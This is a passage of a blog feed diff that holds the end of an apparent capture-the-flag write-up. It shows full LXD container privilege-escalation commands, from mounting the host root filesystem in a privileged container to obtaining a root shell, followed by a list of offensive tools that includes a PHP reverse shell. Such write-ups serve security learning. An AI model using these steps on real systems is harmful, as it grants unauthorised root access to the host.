+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With the Alpine image now downloaded to the victim machine, I can begin the privilege escalation process. I start by importing the image with the alias “privesc” by using this command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxc image import ./alpine-v3.12-x86_64-20200929_2146.tar.gz --alias privesc&lt;/code&gt;. I proceed by using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxc image list&lt;/code&gt; to confirm that the import has been successfull, then I use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxc init privesc joker -c security.privileged=true&lt;/code&gt; to initialize the container with the name “joker.” The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.privileged&lt;/code&gt; flag gives this container the privilege to access all the files we ask it to.&lt;/p&gt;
+
+&lt;p&gt;After that, I use the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true&lt;/code&gt; to add a disk to the container whose source is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;, whose mount path is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/mnt/root&lt;/code&gt;, and with the recursive flag set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;. In other words, this container will contain all files on the system.
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/dev/shm$ lxc image import ./alpine-v3.12-x86_64-20200929_2146.tar.gz --alias privesc      
+&amp;lt;ine-v3.12-x86_64-20200929_2146.tar.gz --alias joker
+www-data@ubuntu:/dev/shm$ 
+www-data@ubuntu:/dev/shm$ lxc image list
+&amp;lt;--Snipped!--&amp;gt;
+www-data@ubuntu:/dev/shm$ lxc init privesc joker -c security.privileged=true
+Creating joker
+www-data@ubuntu:/dev/shm$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true                         
+Device mydevice added to joker
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All that’s left to do is to start the container with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxc start joker&lt;/code&gt; and then use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lxc exec joker /bin/sh&lt;/code&gt; to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt; within the container, thus giving ourselves a shell within that container. Since the container’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security.privileged&lt;/code&gt; flag is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt;, we are granted a root shell within the container, a container which now has access to every single file in the system. 
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/dev/shm$ lxc start joker
+www-data@ubuntu:/dev/shm$ lxc exec joker /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+~ # 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;tools-mentioned&quot;&gt;Tools Mentioned&lt;/h1&gt;
+&lt;dl&gt;
+  &lt;dt&gt;&lt;br /&gt;&lt;/dt&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/maurosoria/dirsearch&quot;&gt;dirsearch&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/OJ/gobuster&quot;&gt;gobuster&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/vanhauser-thc/thc-hydra&quot;&gt;Hydra&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/openwall/john&quot;&gt;JohnTheRipper&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&quot;&gt;linPEAS&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;linux-php-reverse-shell&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/saghul/lxd-alpine-builder&quot;&gt;lxd-alpine-builder&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/sc0tfree/updog&quot;&gt;updog&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/RustScan/RustScan&quot;&gt;RustScan&lt;/a&gt;&lt;/dd&gt;
+  &lt;dd&gt;&lt;a href=&quot;https://github.com/nmap/nmap&quot;&gt;nmap&lt;/a&gt;&lt;/dd&gt;
+&lt;/dl&gt;
+</content>
+ </entry>
+ 
+
+</feed>
